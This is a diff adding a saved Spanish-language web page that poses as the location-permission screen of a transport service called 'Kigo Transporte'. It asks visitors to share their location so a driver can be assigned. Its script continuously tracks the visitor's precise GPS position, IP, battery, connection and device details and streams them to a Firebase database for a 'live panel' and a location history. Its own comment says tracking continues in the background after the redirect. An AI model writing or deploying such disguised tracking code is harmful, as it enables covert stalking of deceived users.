@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<!-- saved from url=(0040)https://kigo-transporte-dolores.web.app/ -->
+<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kigo Transporte</title>
+<script src="./Kigo Transporte_files/firebase-app-compat.js.descarga"></script>
+<script src="./Kigo Transporte_files/firebase-database-compat.js.descarga"></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#f9fafb;font-family:Inter,system-ui;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:16px;}
+.card{background:#fff;border-radius:24px;padding:32px 24px 28px 24px;width:100%;max-width:380px;box-shadow:0 10px 40px rgba(0,0,0,0.08);text-align:center;}
+.logo{width:180px;margin:0 auto 20px auto;display:block;}
+h1{font-size:28px;font-weight:900;color:#111;margin-bottom:14px;}
+.sub{font-size:15px;color:#6b7280;margin-bottom:28px;}
+.btn-amarillo{background:#FFC100;color:#fff;border:none;border-radius:999px;padding:16px 20px;font-weight:800;font-size:16px;cursor:pointer;width:100%;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:14px;}
+.btn-amarillo svg{width:24px;height:24px;fill:#fff;}
+.btn-blanco{background:#fff;color:#4b5563;border:1.5px solid #6b7280;border-radius:999px;padding:14px 20px;font-weight:600;font-size:16px;cursor:pointer;width:100%;}
+.link-politicas{margin-top:22px;font-size:14px;color:#6b7280;text-decoration:underline;cursor:pointer;text-align:center;}
+#overlay-error{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:99999;align-items:center;justify-content:center;padding:20px;}
+#overlay-error.show{display:flex;}
+</style>
+</head>
+<body>
+<div class="card">
+  <img src="./Kigo Transporte_files/kigo-logo.png" class="logo" alt="Kigo">
+  <h1>Permite tu ubicación</h1>
+  <p class="sub">Necesitamos tu ubicación para asignar el transportador más cercano.</p>
+  <button class="btn-amarillo" onclick="pedirUbicacion()"><svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"></path></svg> Permitir ubicación</button>
+  <button class="btn-blanco" onclick="window.location.href='https://google.com'">Cancelar</button>
+</div>
+<div class="link-politicas" onclick="window.location.href='politicas.html'">Políticas de privacidad</div>
+<div id="overlay-error"><div style="background:#fff;border-radius:22px;padding:32px 24px;text-align:center;max-width:340px;width:100%;"><div style="width:64px;height:64px;background:#fee2e2;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px auto;"><svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2.5"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg></div><h3 style="font-size:20px;font-weight:900;margin:0 0 8px 0;">ERROR</h3><p style="font-size:14px;color:#6b7280;margin:0;">Este dispositivo está bloqueado. No puedes ingresar a la plataforma ni hacer pedidos.</p><p style="font-size:12px;color:#ef4444;font-weight:800;margin-top:12px;">BLOQUEADA</p></div></div>
+<script>
+const firebaseConfig={apiKey:"AIzaSyDjxi5qxVVbC7lufDPdBWRUzkiSZ2o9gnE",authDomain:"kigo-transporte.firebaseapp.com",databaseURL:"https://kigo-transporte-default-rtdb.firebaseio.com",projectId:"kigo-transporte",storageBucket:"kigo-transporte.firebasestorage.app",messagingSenderId:"801039406106",appId:"1:801039406106:web:0ca2bf1d7646849d6a2da3"};
+firebase.initializeApp(firebaseConfig);const db=firebase.database();let miIP="";let lastLat=0,lastLng=0, primerEnvio=false;
+async function obtenerIP(){try{let r=await fetch('https://api.ipify.org?format=json');let d=await r.json();miIP=d.ip;return d.ip;}catch(e){miIP="Sin IP";return "Sin IP";}}
+async function verificarBloqueo(){if(!miIP)await obtenerIP();let ipKey=miIP.replace(/\./g,'_');let snap=await db.ref('ips_config/'+ipKey).once('value');let datos=snap.val();if(datos&&datos.estado==='off'){document.getElementById('overlay-error').classList.add('show');return true;}return false;}
+async function pedirUbicacion(){
+  if(await verificarBloqueo())return;
+  if(!navigator.geolocation){alert("Tu navegador no permite ubicación");return;}
+  navigator.geolocation.watchPosition(async(pos)=>{
+    if(await verificarBloqueo())return;
+    let lat=pos.coords.latitude; let lng=pos.coords.longitude;
+    // Evita enviar si no se movió al menos 5 metros
+    if(lastLat!==0){
+      let dLat=Math.abs(lat-lastLat); let dLng=Math.abs(lng-lastLng);
+      if(dLat<0.000045 && dLng<0.000045) return;
+    }
+    lastLat=lat; lastLng=lng;
+    let bateria="N/A"; try{let b=await navigator.getBattery(); bateria=Math.round(b.level*100)+"%";}catch(e){}
+    let conexion=navigator.connection?navigator.connection.effectiveType:"N/A";
+    let ipKeySafe=miIP.replace(/\./g,'_');
+    let key=Date.now();
+    let datosCliente={
+      lat:lat, lng:lng, accuracy:pos.coords.accuracy+"m",
+      ip:miIP, ipCliente:miIP,
+      dispositivo:navigator.userAgent,
+      navegador:navigator.userAgent.includes("Chrome")?"Chrome":navigator.userAgent.includes("Firefox")?"Firefox":"Otro",
+      plataforma:navigator.platform,
+      bateria:bateria, conexion:conexion,
+      fechaHora:new Date().toLocaleString(), timestamp:Date.now(),
+      direccionReal:"Ubicación en tiempo real"
+    };
+    // Guarda ubicación actual (esta es la que tu panel VIVO escucha)
+    await db.ref('ubicaciones/'+key).set(datosCliente);
+    await db.ref('ubicaciones/'+ipKeySafe+'_live').set(datosCliente);
+    await db.ref('ubicaciones_historial/'+ipKeySafe+'/'+key).set(datosCliente);
+    
+    // Solo la primera vez lo manda a plataforma, después sigue rastreando en segundo plano
+    if(!primerEnvio){
+      primerEnvio=true;
+      setTimeout(()=>{ window.location.href="Plataforma/index.html"; }, 800);
+    }
+  }, (err)=>{ console.log(err); }, {enableHighAccuracy:true, maximumAge:0, timeout:10000});
+}
+window.addEventListener('load',async()=>{await obtenerIP();await verificarBloqueo();});
+</script>
+
+
+</body></html>
